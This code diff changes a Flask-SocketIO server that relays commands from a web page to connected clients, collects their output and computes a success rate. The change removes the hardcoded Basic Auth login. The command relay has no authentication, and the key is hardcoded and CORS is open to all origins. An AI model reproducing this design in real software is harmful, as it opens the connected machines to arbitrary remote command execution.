@@ -1,50 +1,35 @@
-from flask import Flask, render_template, request, make_response
+import json
+
+from flask import Flask, request
 from flask_socketio import SocketIO, send, emit, disconnect
-from functools import wraps
-
-# Basic Authentication
-
-
-def auth_required(func):
-    @wraps(func)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if auth and auth.username == 'commander' and auth.password == 'commander123':
-            return func(*args, **kwargs)
-        return make_response('Could not verify you, Commander !', 401, {
-            'WWW-Authenticate': 'Basic realm="Login Required !'
-        })
-
-    return decorated
-
 
 app = Flask(__name__, template_folder='templates/')
 app.config['SECRET_KEY'] = 'secret'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-
-connected_users = {}
-active_users = []
+# GLOBAL SESSION AND EFFICIENCY CARETAKERS
+CONNECTED_USERS = {}
+ACTIVE_USERS = []
+COMMAND_EXECUTION_EFFICIENCY = {}
 
 
 @app.route('/', methods=['GET', 'POST'])
-@auth_required
 def index():
     return "Monitor Server"
 
-
+# Handle First Handshake
 @socketio.on('first_handshake')
 def handle_first_handshake(payload):
 
-    connected_users[payload['client_ID']] = payload['client_Session_ID']
+    CONNECTED_USERS[payload['client_ID']] = payload['client_Session_ID']
     socketio.emit('client_please_report', 'Dummy', broadcast=True)
-    active_users.clear()
+    ACTIVE_USERS.clear()
 
 # Handling command from the frontend and sending to client for execution
 @socketio.on('command_from_web', namespace='/command')
 def command_to_client(payload):
 
-    print(str(payload))
+    COMMAND_EXECUTION_EFFICIENCY.clear()
     recipient_session_ID = payload['client_ID']
     command = payload['command']
     emit('server_commands', command, room=recipient_session_ID)
@@ -53,23 +38,31 @@ def command_to_client(payload):
 @socketio.on('output_from_client')
 def handle_output_from_client(message):
     print(f'The execution in Client was : {message}')
-    socketio.emit('output_from_client_to_web', message)
+    COMMAND_EXECUTION_EFFICIENCY[json.loads(
+        message)['session_ID']] = json.loads(message)['return_code']
+    job_done_successfully = sum(
+        value == 0 for value in COMMAND_EXECUTION_EFFICIENCY.values())
+    server_response = {
+        'response': json.loads(message),
+        'efficiency': job_done_successfully/len(COMMAND_EXECUTION_EFFICIENCY) * 100
+    }
+    socketio.emit('output_from_client_to_web', json.dumps(server_response))
 
 # Taking attendance of realtime clients and updating frontend.
 @socketio.on('realtime_attendance')
 def collect_realtime_attendance(payload):
     payload['client_IP'] = request.access_route
-    active_users.append(payload)
-    socketio.emit('update_connections_list', active_users)
+    ACTIVE_USERS.append(payload)
+    socketio.emit('update_connections_list', ACTIVE_USERS)
 
 # Populating the frontend when reloading.
 @socketio.on('populate_me')
 def populate_frontend(message):
     socketio.emit('client_please_report', 'Dummy', broadcast=True)
-    active_users.clear()
+    ACTIVE_USERS.clear()
 
 
-debug = True
+debug = False
 
 if __name__ == "__main__":
     # app.run(debug=debug)
